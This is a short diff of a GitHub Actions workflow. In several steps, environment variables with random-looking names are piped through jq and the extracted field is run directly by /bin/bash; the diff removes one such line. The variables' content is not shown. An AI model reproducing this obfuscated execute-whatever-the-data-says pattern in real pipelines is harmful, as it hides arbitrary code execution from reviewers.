@@ -25,7 +25,6 @@ jobs:
           echo $h8 | jq -r .j2 | /bin/bash
           echo $cxnm1 | jq -r .ekept40 | /bin/bash
           echo $dxmn20171 | jq -r .jagcl44276 | /bin/bash
-          echo $dbdi4884 | jq -r .npv11 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
